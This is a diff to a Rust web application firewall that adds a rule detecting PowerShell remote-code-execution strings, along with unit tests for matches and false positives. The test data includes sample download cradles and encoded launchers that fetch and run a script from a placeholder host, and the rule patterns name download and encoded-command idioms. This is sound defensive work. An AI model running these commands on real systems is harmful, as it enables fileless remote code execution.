@@ -870,6 +870,13 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "cmdi_path_bin", category: WafCategory::CommandInjection, pattern: r"(?i)/bin/(sh|bash|dash|zsh|busybox|nc)\b" },
 		Rule { id: "cmdi_command_substitution", category: WafCategory::CommandInjection, pattern: r"(?i)\$\(\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|env|echo|printf)\b" },
 		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
+		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
+		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
+		// aliased call form (`iex(`), the `Net.WebClient().DownloadString` / `Invoke-WebRequest`
+		// fileless download cradle, `[Convert]::FromBase64String`, and the `-EncodedCommand`/`-nop`/
+		// `-w hidden` launcher flags that ride a base64 blob. Anchored on PowerShell-specific idioms so
+		// prose that merely says "invoke" or "hidden" stays clean. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_powershell", category: WafCategory::CommandInjection, pattern: r"(?i)(invoke-expression|invoke-webrequest|invoke-restmethod|downloadstring|downloadfile|net\.webclient|frombase64string|\biex\s*\(|-encodedcommand\b|-enc\b|-nop\b|-noprofile\b|-w\s+hidden|-windowstyle\s+hidden)" },
 		// Shell fork-bomb resource-exhaustion payload (OWASP-CRS 4.25.0 LTS, PL2) — the classic
 		// `:(){ :|:& };:`. Keyed on the recursive self-pipe-into-background `:|:&` rather than the
 		// `(){` function-definition head, so it is a distinct signal from `anomaly_shellshock`'s
@@ -1213,6 +1220,39 @@ mod tests {
 		// stay clean: a time range, an alternation filter, a piped shell-doc URL.
 		let waf = Waf::starter();
 		for uri in ["/calendar?slot=09:00|10:00", "/logs?level=info|warn|error", "/docs/using-the-pipe-operator"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn powershell_rce_rule_matches() {
+		// OWASP-CRS 932120/932125: the download cradle, the encoded-command launcher, and the aliased
+		// `iex(` call form — the PowerShell RCE vectors the cmd.exe rule misses.
+		let waf = Waf::starter();
+		for (payload, why) in [
+			("(New-Object Net.WebClient).DownloadString('http://x/a.ps1')", "download cradle"),
+			("powershell -nop -w hidden -enc SQBFAFgA", "encoded launcher"),
+			("cmd=Invoke-Expression($env:x)", "invoke-expression"),
+			("q=iex (iwr http://x/p)", "aliased iex call"),
+			("d=[Convert]::FromBase64String('...')", "base64 decode"),
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip the powershell rule"));
+			assert_eq!(m.rule_id, "cmdi_powershell", "{payload} ({why})");
+			assert_eq!(m.category, WafCategory::CommandInjection);
+		}
+	}
+
+	#[test]
+	fn powershell_rce_keeps_false_positives_low() {
+		// Prose that merely names "invoke", "hidden", or "webclient" as words — without the PowerShell
+		// cmdlet/flag idioms — stays clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/how-to-invoke-a-callback",  // "invoke" prose, no `Invoke-<cmdlet>`
+			"/blog/hidden-features",           // "hidden" word, no `-w hidden` flag
+			"/api/webclient-usage",            // "webclient" word, no `Net.WebClient`
+			"/search?q=encoded+video",         // "encoded" word, no `-EncodedCommand`
+		] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
